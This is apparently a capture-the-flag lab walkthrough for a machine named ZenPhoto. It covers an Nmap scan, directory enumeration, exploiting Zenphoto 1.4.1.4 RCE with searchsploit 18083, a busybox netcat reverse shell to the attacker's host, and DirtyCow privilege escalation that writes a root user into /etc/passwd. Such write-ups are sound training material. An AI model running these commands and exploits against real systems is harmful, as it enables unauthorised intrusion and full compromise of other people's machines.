---
icon: ubuntu
---

# ZenPhoto - intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.41 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 18:52 EDT
Nmap scan report for 192.168.231.41
Host is up (0.032s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
|_http-server-header: CUPS/1.4
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
Aggressive OS guesses: HP P2000 G3 NAS device (96%), Linux 2.6.23 - 2.6.38 (95%), Linux 2.6.32 - 3.13 (95%), Linux 2.6.32 (94%), Linux 2.6.22 (94%), DD-WRT v24-sp1 (Linux 2.4.36) (94%), Linux 2.6.26 - 2.6.35 (94%), Linux 3.10 - 4.11 (93%), Linux 2.6.31 - 2.6.32 (93%), D-Link DIR-600 or DIR-645 WAP (Linux 2.6.33) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   30.47 ms 192.168.45.1
2   30.45 ms 192.168.45.254
3   30.49 ms 192.168.251.1
4   30.62 ms 192.168.231.41
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>

#### Directory Busting

```
dirsearch -u http://192.168.231.41/
```

<figure><img src="../../.gitbook/assets/image (473).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

A quick look at the request via burpsuite yeilds the version

<figure><img src="../../.gitbook/assets/image (467).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (468).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Zenphoto 1.4.1.4 RCE</mark>

```
searchsploit -m 18083
```

#### Feroxbuster&#x20;

```
feroxbuster -u http://192.168.231.41/
```

<figure><img src="../../.gitbook/assets/image (471).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (470).png" alt=""><figcaption></figcaption></figure>

Exploit is looking for zp-core, luckily for us feroxbuster has showed us that it is hiding behind the test

```
php 18083.php 192.168.231.41 /test/
```

<figure><img src="../../.gitbook/assets/image (472).png" alt=""><figcaption></figcaption></figure>

I'll get a reverse shell

```
busybox nc 192.168.45.158 80 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (475).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (477).png" alt=""><figcaption></figcaption></figure>

Linpeas revealed a couple of routes we can take, but I am going to use the dirty cow exploit

### <mark style="color:$primary;">Dirtycow</mark>

Here is a link of the exploit i used: [**LINK**](https://github.com/firefart/dirtycow)

<figure><img src="../../.gitbook/assets/image (478).png" alt=""><figcaption></figcaption></figure>

Now to compile it

```
gcc -pthread dirty.c -o dirty -lcrypt
```

<figure><img src="../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

Now execute it

<figure><img src="../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

we see it managed to modify the /etc/passwd file and at a root user. Let's escalate to root

<figure><img src="../../.gitbook/assets/image (2510).png" alt=""><figcaption></figcaption></figure>
